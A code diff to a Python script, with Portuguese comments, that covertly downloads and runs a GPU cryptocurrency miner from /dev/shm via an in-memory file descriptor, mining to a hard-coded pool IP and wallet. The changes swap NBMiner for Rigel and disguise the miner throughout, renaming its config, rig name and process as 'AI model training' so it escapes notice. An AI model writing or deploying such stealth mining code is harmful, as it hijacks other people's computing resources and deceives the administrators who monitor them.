@@ -8,8 +8,9 @@ import subprocess
 from ctypes import CDLL, get_errno
 import json
 
-MINER_URL = "https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz"
-POOL_CONFIG = "-c train_data.json"
+# URL atualizada para o Rigel Miner
+MINER_URL = "https://github.com/rigelminer/rigel/releases/download/1.21.2/rigel-1.21.2-linux.tar.gz"
+POOL_CONFIG = "-c ai_model_config.json"  # Nome do arquivo de configuração mais discreto
 
 libc = CDLL(None)
 
@@ -32,30 +33,40 @@ def download_and_load_miner():
 def execute_miner(fd):
     with tempfile.TemporaryDirectory(dir="/dev/shm") as tmpdir:
         os.chdir(tmpdir)
+        
+        # Configuração disfarçada como treinamento de IA
         config = {
             "algo": "octopus",
             "url": "stratum+ssl://54.232.215.174:8443",
             "user": "krxY97WV2D.CLD",
-            "pass": "x"
+            "pass": "x",
+            "rigName": "AIModelTrainer"  # Nome do rig disfarçado
         }
-        with open("train_data.json", "w") as f:
+        
+        with open("ai_model_config.json", "w") as f:
             json.dump(config, f)
+            
         tar_cmd = ["/bin/tar", "xzf", f"/proc/self/fd/{fd}", "-C", tmpdir]
         subprocess.run(tar_cmd, check=True, pass_fds=[fd])
+        
+        # Procurar pelo executável e renomeá-lo para parecer um processo de treinamento de IA
         miner_bin = None
         for root, dirs, files in os.walk(tmpdir):
-            if "nbminer" in files:
-                miner_bin = os.path.join(root, "nbminer")
-                new_path = os.path.join(root, "apt")
+            if "rigel" in files:
+                miner_bin = os.path.join(root, "rigel")
+                new_path = os.path.join(root, "ai_training")  # Nome mais discreto para o processo
                 os.rename(miner_bin, new_path)
                 miner_bin = new_path
                 break
+        
         if not miner_bin:
             raise FileNotFoundError("Arquivo do minerador não encontrado")
+            
         os.chmod(miner_bin, 0o755)
         args = [miner_bin] + POOL_CONFIG.split()
         env = os.environ.copy()
         env["LD_PRELOAD"] = ""
+        
         pid = os.fork()
         if pid == 0:
             os.close(fd)
@@ -70,5 +81,8 @@ if __name__ == "__main__":
     except Exception as e:
         print(f"Erro: {e}")
     finally:
-        os.close(mem_fd)
+        try:
+            os.close(mem_fd)
+        except:
+            pass
 EOF
